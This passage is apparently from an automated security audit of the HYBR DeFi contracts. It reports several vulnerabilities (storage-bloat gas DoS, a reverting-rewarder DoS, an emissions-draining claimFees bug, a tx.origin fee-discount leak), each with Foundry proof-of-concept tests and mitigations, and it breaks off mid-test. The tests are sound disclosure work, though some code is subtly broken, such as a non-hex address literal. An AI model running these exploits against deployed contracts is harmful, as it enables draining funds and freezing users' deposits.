import {GaugeV2} from "contracts/GaugeV2.sol";
import {IPermissionsRegistry} from "contracts/interfaces/IPermissionsRegistry.sol";
import {ITokenHandler} from "contracts/interfaces/ITokenHandler.sol";
import {IPairFactory} from "contracts/interfaces/IPairFactory.sol";
import {IPairInfo} from "contracts/interfaces/IPairInfo.sol";
import {IBribeFactory} from "contracts/interfaces/IBribeFactory.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n,s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockVE { address public token_; constructor(address t){token_=t;} function token() external view returns(address){return token_;} }

contract MockPR is IPermissionsRegistry { function emergencyCouncil() external pure returns(address){return address(0);} function hybraTeamMultisig() external pure returns(address){return address(0);} function hasRole(bytes memory, address) external pure returns(bool){ return true; } }

contract MockTH is ITokenHandler {
    mapping(address=>bool) wl; mapping(address=>bool) conn;
    function set(address t,bool w,bool c) external { wl[t]=w; conn[t]=c; }
    function isWhitelisted(address t) external view returns (bool){ return wl[t]; }
    function isWhitelistedNFT(uint256) external pure returns (bool){ return true; }
    function isConnector(address t) external view returns (bool){ return conn[t]; }
    function whitelistToken(address) external pure {}
    function blacklistToken(address) external pure {}
    function whiteListed(uint256) external pure returns (address){ return address(0);} 
    function connectors(uint256) external pure returns (address){ return address(0);} 
    function whiteListedTokensLength() external pure returns (uint256){ return 0; }
    function connectorTokensLength() external pure returns (uint256){ return 0; }
    function whiteListedTokens() external pure returns(address[] memory){ address[] memory a; return a; }
    function connectorTokens() external pure returns(address[] memory){ address[] memory a; return a; }
}

contract MockPairFactory is IPairFactory {
    function allPairsLength() external pure returns (uint){return 0;}
    function isPair(address) external pure returns (bool){return true;}
    function allPairs(uint) external pure returns (address){return address(0);} 
    function pairCodeHash() external pure returns (bytes32){return bytes32(0);} 
    function getPair(address,address,bool) external pure returns (address){return address(0);} 
    function createPair(address,address,bool) external pure returns (address){return address(0);} 
    function isGenesis(address) external pure returns (bool){return false;}
}

contract MockPair is IPairInfo {
    address public t0; address public t1;
    constructor(address _t0, address _t1){ t0=_t0; t1=_t1; }
    function claimFees() external pure returns (uint,uint){ return (0,0); }
    function tokens() external view returns(address,address){ return (t0, t1); }
    function token0() external view override returns(address){ return t0; }
    function reserve0() external pure override returns(uint){ return 0; }
    function decimals0() external pure override returns(uint){ return 18; }
    function token1() external view override returns(address){ return t1; }
    function reserve1() external pure override returns(uint){ return 0; }
    function decimals1() external pure override returns(uint){ return 18; }
    function isPair(address) external pure override returns(bool){ return true; }
}

contract MockBribe { /* no-op; we won't call into it in this test */ }

contract MockBribeFactory is IBribeFactory {
    function createInternalBribe(address[] memory) external pure returns (address){return address(0);} 
    function createExternalBribe(address[] memory) external pure returns (address){return address(0);} 
    function createBribe(address,address,address,string memory) external returns (address){ return address(new MockBribe()); }
}

contract GaugeBribeDesyncMinimalTest is Test {
    GaugeManager gm; GaugeFactory gf; MockPR pr; MockTH th; MockBribeFactory bf; MockERC20 base; MockVE ve; MockPairFactory pf;
    MockERC20 tokenA; MockERC20 tokenB; MockPair pair;

    function setUp() public {
        base = new MockERC20("HYBR","HYBR");
        ve = new MockVE(address(base));
        pr = new MockPR();
        th = new MockTH();
        bf = new MockBribeFactory();
        pf = new MockPairFactory();
        tokenA = new MockERC20("T0","T0"); tokenB = new MockERC20("T1","T1");
        th.set(address(tokenA), true, true); th.set(address(tokenB), true, true);
        gf = new GaugeFactory(); gf.initialize(address(pr)); gf.setRHYBR(address(base));
        gm = new GaugeManager(); gm.initialize(address(ve), address(th), address(gf), address(0), address(pf), address(0), address(pr), address(0));
        vm.prank(address(this)); gm.setBribeFactory(address(bf));
        pair = new MockPair(address(tokenA), address(tokenB));
    }

    function test_DesyncBetweenManagerAndGaugePointers() public {
        (address g, address intB0, address extB0) = gm.createGauge(address(pair), 0);
        assertTrue(g != address(0));
        // initial state consistent
        assertEq(GaugeV2(g).internal_bribe(), intB0, "gauge points to intB0");
        assertEq(gm.internal_bribes(g), intB0, "manager points to intB0");

        // rotate bribes via GaugeManager only (does not touch gauge)
        address intB1 = address(new MockBribe());
        address extB1 = address(new MockBribe());
        vm.prank(address(this));
        gm.setNewBribes(g, intB1, extB1);

        // manager mapping updated, gauge still points to old internal bribe
        assertEq(gm.internal_bribes(g), intB1, "manager updated to intB1");
        assertEq(GaugeV2(g).internal_bribe(), intB0, "gauge still at intB0 (desync)");
    }
}


## Suggested Mitigation
Update GaugeManager’s rotation functions to atomically update the Gauge contract’s internal_bribe before updating the registry mapping. For example:

- In setInternalBribeFor and setNewBribes:
  1) Validate _internal.code.length > 0.
  2) Determine gauge type via isCLGauge[_gauge] and call the appropriate factory setter with a single-element array:
     • IGaugeFactory(_factoriesData.gaugeFactories[0]).setInternalBribe([_gauge], [_internal]) for V2 gauges.
     • IGaugeFactoryCL(_factoriesData.gaugeFactories[1]).setInternalBribe([_gauge], [_internal]) for CL gauges.
  3) After the factory call succeeds, write internal_bribes[_gauge] = _internal and emit events.

- Consider deprecating or guarding setExternalBribeFor unless there is a corresponding in-gauge usage (GaugeV2/GaugeCL do not consume external_bribe at runtime). If external bribe rotation remains, clearly document that only the registry is updated.

- Add tests asserting GaugeV2/GaugeCL.internal_bribe == GaugeManager.internal_bribes[g] after any change.

Optionally, emit a warning event if a rotation would create a mismatch (or perform a runtime check and revert if gauge.internal_bribe != expected old value to avoid silent desyncs).





 **Derived From** : Per-user append-only lock array can bloat storage and DoS transfers

## [M-5]. GrowthHYBR userLocks[] grows unbounded; expired-lock cleanup in _beforeTokenTransfer can gas-DoS sender transfers

## Derived From Pattern/Invariant
Per-user append-only lock array can bloat storage and DoS transfers

## Exploit Type
GasGriefBlockLimit

## Location
GrowthHYBR._beforeTokenTransfer

## Minimim Privilege Required
Permissionless

## Description
GrowthHYBR tracks per-user transfer-locks as an append-only array. Each deposit mints gHYBR to the recipient and pushes a new UserLock entry: amount = shares, unlockTime = now + transferLockPeriod. Arrays are only compacted lazily in _cleanExpired(), which linearly scans the entire userLocks[user] array and is called from _beforeTokenTransfer only when the sender's available balance is insufficient. An attacker can grief a target by sending many dust deposits to that target (recipient), creating thousands of lock entries with the same unlockTime. After locks expire (or if the sender attempts to transfer > available), any transfer by the target triggers _cleanExpired() to iterate over all entries, potentially exceeding block gas and reverting, effectively DoS'ing their transfers. Even without DoS, this grows persistent storage unboundedly.

Vulnerable snippets:

mapping(address => UserLock[]) public userLocks;
...
function _addTransferLock(address user, uint256 amount) internal {
    userLocks[user].push(UserLock({ amount: amount, unlockTime: block.timestamp + transferLockPeriod }));
    lockedBalance[user] += amount;
}

function _cleanExpired(address user) internal returns (uint256 freed) {
    UserLock[] storage arr = userLocks[user];
    for (uint256 i = 0; i < arr.length; i++) { ... }
    while (arr.length > write) { arr.pop(); }
}

function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
    ...
    uint256 currentAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;
    if (currentAvailable >= amount) { return; }
    _cleanExpired(from); // O(arr.length)
    ...
}

## Impact
Targeted accounts’ transfers can revert out-of-gas (or become prohibitively expensive) after accumulating a large userLocks[from] array; persistent storage grows unboundedly per user.

## Proof of Concept
1) Attacker acquires HYBR and repeatedly calls deposit(1, victim), setting recipient=victim. Each call mints 1 gHYBR share to victim and pushes a new lock entry with unlockTime ~ now + transferLockPeriod. After N repetitions, userLocks[victim].length == N and lockedBalance[victim] == N.
2) After transferLockPeriod elapses, lockedBalance[victim] remains N until cleaned. The victim attempts to transfer any amount > 0. _beforeTokenTransfer sees currentAvailable = balanceOf - lockedBalance = 0, so it calls _cleanExpired(victim).
3) _cleanExpired linearly scans O(N) entries; for sufficiently large N, this can exceed the block gas limit and revert, DoS’ing the victim’s transfers. Even if not OOG, the gas cost is attacker-controlled and can be made impractical.
4) The userLocks array persists across time; cleanup only happens when the victim tries to transfer and crosses the ‘available’ threshold, making the grief repeatable and storage-bloating.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {HYBR} from "contracts/HYBR.sol";
import {VotingEscrow} from "contracts/VotingEscrow.sol";
import {GrowthHYBR} from "contracts/GovernanceHYBR.sol";

contract GrowthHYBR_StateBloat_Test is Test {
    HYBR internal hybr;
    VotingEscrow internal ve;
    GrowthHYBR internal ghybr;

    address internal attacker = address(0xA11CE);
    address internal victim   = address(0xBEEF);
    address internal sink     = address(0xCAFE);

    function setUp() public {
        // Deploy core pieces
        hybr = new HYBR(); // minter = this
        ve   = new VotingEscrow(address(hybr), address(0x1));
        ghybr = new GrowthHYBR(address(hybr), address(ve));
        ghybr.setTeam(address(this));

        // Fund attacker with HYBR
        hybr.mint(attacker, 1_000_000 ether);

        // Attacker will approve gHYBR to pull HYBR
        vm.startPrank(attacker);
        hybr.approve(address(ghybr), type(uint256).max);
        vm.stopPrank();
    }

    function test_StateGrowth_DoS_onTransferCleanup() public {
        uint256 N = 5000; // illustrative; attacker can scale this much higher on-chain

        // Attacker griefs victim by creating N lock entries (1 wei each)
        vm.startPrank(attacker);
        for (uint256 i = 0; i < N; i++) {
            ghybr.deposit(1, victim); // push new UserLock for victim
        }
        vm.stopPrank();

        // Sanity: victim received N shares, fully locked
        assertEq(ghybr.balanceOf(victim), N);
        assertEq(ghybr.lockedBalance(victim), N);

        // Before expiry, any transfer attempts will trigger _cleanExpired() path and then revert "Tokens locked"
        vm.prank(victim);
        vm.expectRevert(bytes("Tokens locked"));
        ghybr.transfer(sink, 1);

        // After expiry, lockedBalance still equals N until cleanup, so transfer triggers O(N) cleanup
        // Warp past transferLockPeriod to make all locks expired
        uint256 period = ghybr.transferLockPeriod();
        vm.warp(block.timestamp + period + 1);

        // This call will iterate over the full userLocks[victim] array (O(N)) inside _cleanExpired.
        // For sufficiently large N on-chain, this can exceed the block gas limit and revert OOG.
        // Here we assert logical success to prove cleanup is attempted; the grief is the gas cost / potential OOG.
        vm.prank(victim);
        bool ok = ghybr.transfer(sink, 1);
        assertTrue(ok);

        // After cleanup, lockedBalance should be reduced, and victim balance decreased by 1
        assertGt(ghybr.balanceOf(sink), 0);
        assertLt(ghybr.lockedBalance(victim), N);
    }
}


## Suggested Mitigation
- Coalesce locks: when adding a new lock with identical unlock time bucket, merge into the last entry instead of pushing a new struct. Example: round unlockTime to an interval (e.g., minute) and accumulate amount in the latest entry.
- Put an upper bound on per-user lock entries (e.g., <= 256) and revert deposits that would exceed it unless they can be merged.
- Proactively clean on deposit/mint paths for the recipient (and optionally on balance queries) so arrays cannot grow unbounded.
- Alternatively replace per-user dynamic arrays with a small ring buffer or a mapping of unlockTime => amount plus a compact list of active buckets to cap iteration work.





 **Derived From** : Untrusted Rewarder callback can revert and brick deposit/withdraw/harvest

## [M-6]. GaugeV2 DoS: unguarded gaugeRewarder.onReward revert blocks deposit, withdraw, and harvest

## Derived From Pattern/Invariant
Untrusted Rewarder callback can revert and brick deposit/withdraw/harvest

## Exploit Type
Dos

## Location
GaugeV2._deposit, _withdraw, getReward

## Minimim Privilege Required
RequireAdminRole

## Description
GaugeV2 calls an external, owner-settable rewarder without isolation in core user flows. Any revert in onReward aborts the entire action, letting a buggy/malicious rewarder brick deposits, withdrawals, and harvesting for all users until governance intervenes. Vulnerable calls:
- In _deposit(): IRewarder(gaugeRewarder).onReward(account, account, _balanceOf(account));
- In _withdraw(): IRewarder(gaugeRewarder).onReward(msg.sender, msg.sender, _balanceOf(msg.sender));
- In getReward(): IRewarder(gaugeRewarder).onReward(_user, _user, _balanceOf(_user));
No try/catch or error isolation is used, so a single revert from gaugeRewarder halts the transaction.

## Impact
A revert in the externally owned, owner-settable gaugeRewarder will revert core user flows: deposit, withdraw, and harvest (getReward). This creates a protocol-wide availability DoS where LPs cannot enter or exit positions and cannot claim rewards until the owner replaces the rewarder or activates emergency mode (onlyOwner). Funds are immobilized in the interim; emergencyWithdraw is available only if governance toggles the emergency flag.

## Proof of Concept
1) Admin sets gaugeRewarder to a malicious/broken contract whose onReward() always reverts.
2) Any user calling deposit() hits onReward in _deposit and the tx reverts.
3) Existing stakers attempting withdraw() also revert in _withdraw's onReward, trapping their LP funds.
4) getReward() reverts for all users, blocking harvesting as well.
This bricks core gauge functionality until governance resets the rewarder or flips emergency mode (admin action).

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "contracts/GaugeV2.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18; uint public totalSupply;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    event Transfer(address indexed from, address indexed to, uint amount);
    event Approval(address indexed owner, address indexed spender, uint amount);
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint amount) external returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint amount) external returns (bool) {
        uint allowed = allowance[from][msg.sender]; require(allowed >= amount, "allow"); allowance[from][msg.sender] = allowed - amount;
        require(balanceOf[from] >= amount, "bal"); balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true;
    }
}

contract MaliciousRewarder is IRewarder {
    function onReward(address, address, uint256) external pure override { revert("REWARDER_REVERT"); }
}

contract MockRHYBR {
    function depostionEmissionsToken(uint256) external {}
    function redeemFor(uint256, uint8, address) external {}
}

contract GaugeV2_RewarderDoS_Test is Test {
    MockERC20 lp;
    MockERC20 reward;
    GaugeV2 gauge;
    MockRHYBR rhybr;
    address alice = address(0xA11CE);

    function setUp() public {
        lp = new MockERC20("LP", "LP");
        reward = new MockERC20("RWD", "RWD");
        rhybr = new MockRHYBR();
        gauge = new GaugeV2(
            address(reward),
            address(rhybr),
            address(0xVE),
            address(lp),
            address(this),
            address(0x1),
            address(0x2),
            false
        );
        lp.mint(alice, 100 ether);
        vm.prank(alice); lp.approve(address(gauge), type(uint256).max);
    }

    function test_Deposit_Reverts_WhenRewarderReverts() public {
        MaliciousRewarder m = new MaliciousRewarder();
        gauge.setGaugeRewarder(address(m));
        vm.prank(alice);
        vm.expectRevert(bytes("REWARDER_REVERT"));
        gauge.deposit(1 ether);
    }

    function test_Withdraw_Reverts_WhenRewarderReverts() public {
        // deposit succeeds while no rewarder set
        vm.prank(alice); gauge.deposit(1 ether);
        assertEq(gauge.totalSupply(), 1 ether);
        // set malicious rewarder → withdraw bricks
        MaliciousRewarder m = new MaliciousRewarder();
        gauge.setGaugeRewarder(address(m));
        vm.prank(alice);
        vm.expectRevert(bytes("REWARDER_REVERT"));
        gauge.withdraw(1 ether);
        assertEq(gauge.totalSupply(), 1 ether); // still stuck
    }

    function test_GetReward_Reverts_WhenRewarderReverts() public {
        MaliciousRewarder m = new MaliciousRewarder();
        gauge.setGaugeRewarder(address(m));
        vm.prank(alice);
        vm.expectRevert(bytes("REWARDER_REVERT"));
        gauge.getReward(uint8(0));
    }
}


## Suggested Mitigation
Make the rewarder callback non-blocking and bounded: (1) wrap the external call with try/catch so any revert is ignored, and (2) cap forwarded gas to prevent grief via gas exhaustion, and (3) emit an event on failure for monitoring. For example: if (gaugeRewarder != address(0)) { try IRewarder(gaugeRewarder).onReward{gas: 50000}(u, r, bal) { } catch (bytes memory reason) { emit RewarderCallFailed(gaugeRewarder, u, reason); } } Optionally add a governance flag rewarderMustSucceed (default false) to allow stricter behavior only when explicitly desired, and validate new rewarders (e.g., code size > 0) before setting.


## [M-7]. GaugeV2: Malicious or misconfigured rewarder can revert in onReward and DoS deposits, withdrawals, and harvests

## Derived From Pattern/Invariant
Untrusted Rewarder callback can revert and brick deposit/withdraw/harvest

## Exploit Type
Dos

## Location
GaugeV2._deposit | _withdraw | getReward

## Minimim Privilege Required
RequireAdminRole

## Description
GaugeV2 unconditionally calls an external gaugeRewarder.onReward hook in core user flows without try/catch. Any revert in the hook reverts the entire user action, enabling a malicious or buggy rewarder to DoS deposits, withdrawals, and reward harvesting. Vulnerable calls:
- _deposit(): IRewarder(gaugeRewarder).onReward(account, account, _balanceOf(account));
- _withdraw(): IRewarder(gaugeRewarder).onReward(msg.sender, msg.sender, _balanceOf(msg.sender));
- getReward(): IRewarder(gaugeRewarder).onReward(_user, _user, _balanceOf(_user));
Because these calls are not isolated, a reverting rewarder bricks user operations until governance/admin removes or fixes it.

## Impact
A reverting gaugeRewarder.onReward() call can brick deposits, standard withdrawals, and reward harvests for all users of the gauge (or selectively per user if the rewarder reverts conditionally), causing a protocol-wide availability DoS for that gauge. Users’ principal remains in the contract; however, without owner intervention (switching rewarder or enabling emergency mode), funds are effectively frozen. Emergency withdraws are only possible after the owner activates emergency mode, which is a governance-dependent escape hatch and does not mitigate the liveness break under normal operation.

## Proof of Concept
1) Owner sets gaugeRewarder to a contract whose onReward() always reverts.
2) Any user deposit reverts inside _deposit before the token transfer, blocking new deposits.
3) Existing stakers cannot withdraw: _withdraw calls onReward() and reverts, freezing principal (until owner changes rewarder or enables emergency mode).
4) Harvests via getReward() also revert even when reward == 0, since onReward() is called unconditionally.
5) The rewarder can implement conditional logic to revert only for targeted users, enabling per-user griefing as well as complete gauge DoS.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {GaugeV2} from "contracts/GaugeV2.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s){ name=n; symbol=s; }
    function mint(address to, uint256 amt) external { balanceOf[to]+=amt; totalSupply+=amt; emit Transfer(address(0), to, amt);}    
    function approve(address sp, uint256 amt) external returns (bool){ allowance[msg.sender][sp]=amt; emit Approval(msg.sender,sp,amt); return true; }
    function transfer(address to, uint256 amt) external returns (bool){ require(balanceOf[msg.sender]>=amt, "bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; emit Transfer(msg.sender,to,amt); return true; }
    function transferFrom(address from,address to,uint256 amt) external returns (bool){ require(balanceOf[from]>=amt, "bal"); uint256 a=allowance[from][msg.sender]; require(a>=amt, "allow"); if(a!=type(uint256).max){ allowance[from][msg.sender]=a-amt; } balanceOf[from]-=amt; balanceOf[to]+=amt; emit Transfer(from,to,amt); return true; }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Minimal rHYBR stub with only the functions used by GaugeV2
contract MockRHYBR {
    function depostionEmissionsToken(uint256) external {}
    function redeemFor(uint256, uint8, address) external {}
}

// Do NOT redeclare IRewarder (it exists in GaugeV2 import). Just implement the function signature.
contract RevertingRewarder { function onReward(address, address, uint256) external pure { revert("grief"); } }
contract NoopRewarder { function onReward(address, address, uint256) external pure {} }

contract GaugeV2RewarderRevertDosTest is Test {
    GaugeV2 gauge;
    MockERC20 lp;
    MockERC20 reward;
    MockRHYBR rhybr;
    address user = address(0xBEEF);

    function setUp() public {
        lp = new MockERC20("LP","LP");
        reward = new MockERC20("HYBR","HYBR");
        rhybr = new MockRHYBR();
        // constructor(rewardToken, rHYBR, ve, token, distribution, internal_bribe, external_bribe, isForPair)
        gauge = new GaugeV2(address(reward), address(rhybr), address(0x1111), address(lp), address(this), address(0xB1), address(0xB2), false);
        lp.mint(user, 1e18);
        vm.prank(user); lp.approve(address(gauge), type(uint256).max);
    }

    function test_Deposit_DoS_WhenRewarderReverts() public {
        gauge.setGaugeRewarder(address(new RevertingRewarder()));
        vm.prank(user);
        vm.expectRevert("grief");
        gauge.deposit(1e18);
    }

    function test_Withdraw_DoS_WhenRewarderReverts() public {
        gauge.setGaugeRewarder(address(new NoopRewarder()));
        vm.prank(user); gauge.deposit(1e18);

        gauge.setGaugeRewarder(address(new RevertingRewarder()));
        vm.prank(user);
        vm.expectRevert("grief");
        gauge.withdraw(1e18);
    }

    function test_Harvest_DoS_WhenRewarderReverts() public {
        gauge.setGaugeRewarder(address(new NoopRewarder()));
        vm.prank(user); gauge.deposit(1);

        gauge.setGaugeRewarder(address(new RevertingRewarder()));
        vm.prank(user);
        vm.expectRevert("grief");
        gauge.getReward(uint8(0));
    }
}


## Suggested Mitigation
Make the rewarder hook non-blocking in all paths (deposit, withdraw, getReward). Use try/catch or a low-level call with a gas cap and ignore failures, optionally emitting an event for observability. Example:

if (gaugeRewarder != address(0)) {
    (bool ok,) = gaugeRewarder.call{gas: 50_000}(
        abi.encodeWithSelector(IRewarder.onReward.selector, user, recipient, _balanceOf(user))
    );
    if (!ok) { /* emit RewarderCallFailed(gaugeRewarder, user); */ }
}

Additional hardening:
- Place the hook after core state transitions and transfers where safe, but ensure it remains non-blocking.
- Add an owner-settable switch to temporarily disable the rewarder if needed.
- Consider per-user opt-out for the hook (at least for withdraw) so principal retrieval cannot be blocked.





 **Derived From** : Fee-on-transfer assumptions in emissions/fees cause mis-accounting or DoS

## [H-8]. GaugeCL.claimFees sweeps entire token0/token1 balances (not deltas), draining HYBR emissions when pool includes HYBR

## Derived From Pattern/Invariant
Fee-on-transfer assumptions in emissions/fees cause mis-accounting or DoS

## Exploit Type
FeeOnTransferAssumption

## Location
GaugeCL.claimFees

## Minimim Privilege Required
Permissionless

## Description
GaugeCL._claimFees() computes claimed amounts using the full ERC20 balances after clPool.collectFees() instead of the post-collect deltas. If the CL pool's token0 or token1 equals the reward token (HYBR), calling claimFees will treat the gauge’s entire HYBR balance (including emissions for LPs) as fees and forward it to the internal bribe via notifyRewardAmount. This drains emission reserves and subsequently causes reward redemptions/withdrawals to revert when GaugeCL later attempts to deposit HYBR into rHYBR. Vulnerable snippet:

function _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {
  ...
  clPool.collectFees();
  address _token0 = clPool.token0();
  address _token1 = clPool.token1();
  // BUG: uses whole balances, not deltas
  claimed0 = IERC20(_token0).balanceOf(address(this));
  claimed1 = IERC20(_token1).balanceOf(address(this));
  if (claimed0 > 0) {
    IERC20(_token0).safeApprove(internal_bribe, 0);
    IERC20(_token0).safeApprove(internal_bribe, _fees0);
    IBribe(internal_bribe).notifyRewardAmount(_token0, _fees0);
  }
  ...
}

Impact: any EOA can trigger claimFees at any time and sweep all HYBR held by the gauge (if HYBR is token0/token1 of the pool), redirecting emissions to bribes and bricking LP reward claims/withdrawals due to missing HYBR.

## Impact
Any address can repeatedly call claimFees() on a CL gauge whose pool token0 or token1 is HYBR. Because the function forwards the entire token0/token1 balances (not just newly collected fees), it will redirect all HYBR held by the gauge (emission reserves) to the internal bribe. This results in loss of emissions intended for LPs and likely DoS of getReward/withdraw flows when the gauge later attempts to deposit HYBR into rHYBR but no longer has sufficient balance.

## Proof of Concept
Attack outline:
1) Consider a CL pool where token0 == HYBR (e.g., HYBR/USDC). The GaugeCL for this pool holds HYBR emissions between user harvests.
2) Any EOA calls claimFees(). GaugeCL calls clPool.collectFees() and then reads claimed0 = HYBR.balanceOf(gauge) and claimed1 for token1.
3) GaugeCL approves the internal bribe for claimed0 and calls bribe.notifyRewardAmount(HYBR, claimed0). Bribe transfers HYBR from the gauge via transferFrom using the just-set allowance.
4) Because claimed0 was the entire HYBR balance, all emissions in the gauge are swept to the bribe. Repeating step (2) drains any newly supplied HYBR each time.
5) Later, LP harvest/withdraw triggers _getReward, which approves rHYBR and expects rHYBR to pull HYBR. With the gauge emptied by claimFees(), the transferFrom fails, causing user reward flows to revert.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "contracts/CLGauge/GaugeCL.sol";
import "contracts/HYBR.sol";
import "contracts/interfaces/IBribe.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockBribe is IBribe {
    mapping(address => uint256) public pulled;
    function notifyRewardAmount(address token, uint amount) external override {
        // Pull from Gauge using allowance it just set
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        pulled[token] += amount;
    }
    function deposit(uint,uint) external override {}
    function withdraw(uint,uint) external override {}
    function getRewardForAddress(address, address[] memory) external override {}
    function left(address) external view override returns (uint) { return 0; }
    function getReward(uint, address[] memory) external override {}
    function bribeTokens(uint256) external view override returns (address) { return address(0); }
    function rewardsListLength() external view override returns (uint256) { return 0; }
    function tokenRewardsPerEpoch(address, uint256) external view override returns (uint256) { return 0; }
}

// Minimal pool exposing only what GaugeCL.claimFees() uses
contract MinimalPool {
    address public _t0;
    address public _t1;
    constructor(address t0, address t1) { _t0 = t0; _t1 = t1; }
    function token0() external view returns (address) { return _t0; }
    function token1() external view returns (address) { return _t1; }
    function collectFees() external {} // no-op; GaugeCL wrongly uses balances, not deltas
}

contract ClaimFeesDrainsEmissionTest is Test {
    HYBR internal hybr; // reward token
    HYBR internal usdc; // stand-in ERC20 mock
    GaugeCL internal gauge;
    MockBribe internal bribe;
    MinimalPool internal pool;

    address internal ve = address(0xBEEF);
    address internal distribution = address(0xD1);
    address internal externalBribe = address(0);
    address internal nfpm = address(0xABCD);
    address internal factory = address(0xFACA);

    function setUp() public {
        hybr = new HYBR();
        usdc = new HYBR(); // simple ERC20 mock
        bribe = new MockBribe();
        // Pool with token0 == HYBR (emissions token), token1 == USDC
        pool = new MinimalPool(address(hybr), address(usdc));
        // Gauge: rewardToken=HYBR, rHYBR dummy, isForPair=true
        gauge = new GaugeCL(
            address(hybr),
            address(0xdead),
            ve,
            address(pool),
            distribution,
            address(bribe),
            externalBribe,
            true,
            nfpm,
            factory
        );
    }

    function test_claimFeesSweepsAllHYBRWhenToken0IsHYBR() public {
        // Simulate HYBR emissions sitting in the gauge (e.g., post-notify)
        hybr.mint(address(this), 1_000e18);
        hybr.transfer(address(gauge), 1_000e18);
        assertEq(hybr.balanceOf(address(gauge)), 1_000e18, "gauge pre HYBR bal");

        // Anyone can call claimFees()
        (uint256 claimed0, uint256 claimed1) = gauge.claimFees();

        // Entire HYBR balance swept as claimed0 (token0 == HYBR)
        assertEq(claimed0, 1_000e18, "claimed0 equals full HYBR balance");
        assertEq(claimed1, 0, "no token1 fees claimed");

        // Bribe pulled all HYBR from gauge via notifyRewardAmount
        assertEq(hybr.balanceOf(address(gauge)), 0, "gauge HYBR drained");
        assertEq(hybr.balanceOf(address(bribe)), 1_000e18, "bribe received all HYBR");
    }
}


## Suggested Mitigation
Compute and forward only the deltas collected from the pool, not the entire balances. Example:
- Read pre balances for token0 and token1.
- Call clPool.collectFees().
- Compute delta0 = balanceAfter0 - balanceBefore0; delta1 analogously.
- Notify the internal bribe with delta amounts only.
This prevents sweeping unrelated funds (like HYBR emissions) that reside in the gauge for other purposes. Additionally, consider using clPool.gaugeFees() as a reference value if available, but still rely on pre/post balance deltas around collectFees to avoid mis-accounting due to prior holdings. No permission change is required; keep claimFees() permissionless but strictly delta-based.





 **Derived From** : forall state-mutating calls: require(msg.sender == factory.swapFeeManager()); additionally, where applicable, require(factory.isPool(_pool))

## [H-9]. Fee discount privilege leaks via tx.origin in DynamicSwapFeeModule.getFee allowing arbitrary contracts to piggyback a discounted EOA

## Derived From Pattern/Invariant
forall state-mutating calls: require(msg.sender == factory.swapFeeManager()); additionally, where applicable, require(factory.isPool(_pool))

## Exploit Type
TxOrigin

## Location
DynamicSwapFeeModule.getFee

## Minimim Privilege Required
Permissionless

## Description
DynamicSwapFeeModule applies user-specific fee discounts by checking discounted[tx.origin] inside getFee(). This is a tx.origin authorization anti-pattern: any contract invoked by a discounted EOA in the same transaction inherits that discount, even when the contract is trading its own inventory. As a result, aggregators or malicious routers can add self-serving swaps/arbitrage within the user's transaction and pay less fees (e.g., 50% off), reducing matured fee yield owed to LPs/gauges. Vulnerable snippet:

if (discounted[tx.origin] > 0) {
    uint256 discount = FullMath.mulDivRoundingUp(totalFee, discounted[tx.origin], 1_000_000);
    totalFee = totalFee - discount;
}

Impact: Unauthorized discount use by arbitrary contracts; reduced fee revenue across pools; siphons matured yield from LPs and internal bribes.

## Impact
Any contract called within a discounted EOA’s transaction (routers, aggregators, vaults) receives the same fee discount, even when trading its own inventory. This reduces matured fee revenue for LPs/gauges across all pools and can be systematically exploited by aggregators inserting self-serving legs. The loss is immediate and unbounded by dust thresholds, therefore constitutes a direct loss of matured yield.

## Proof of Concept
Reproduction steps
1) Governance sets a 50% discount for VIP EOA V.
2) Aggregator/router R executes swaps via CLPool on behalf of V (standard UX). Because DynamicSwapFeeModule.getFee() keys on discounted[tx.origin], every getFee call during that transaction (including R’s own inserted legs) gets the 50% discount.
3) R inserts additional self-serving swaps/arbitrage legs and pays reduced fees, extracting extra profit while depriving LPs/gauges of fee revenue.
4) No special privileges needed; any contract invoked during V’s transaction inherits V’s discount.

Key root cause
DynamicSwapFeeModule.getFee() uses tx.origin:
if (discounted[tx.origin] > 0) { totalFee -= mulDivRoundingUp(totalFee, discounted[tx.origin], 1_000_000); }
This applies the VIP’s discount to arbitrary contracts executing within the same transaction instead of only the actual swap caller/payer.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.7.6;

import "forge-std/Test.sol";
import "contracts/core/CLFactory.sol";
import "contracts/core/fees/DynamicSwapFeeModule.sol";

contract MockPool {
    function tickSpacing() external pure returns (int24) { return 200; }
    function slot0() external pure returns (uint160, int24, uint16, uint16, uint16, bool) {
        return (0, 0, 0, 0, 0, true);
    }
    function observe(uint32[] calldata) external pure returns (int56[] memory, uint160[] memory) {
        revert("unused");
    }
}

contract AttackerRouter {
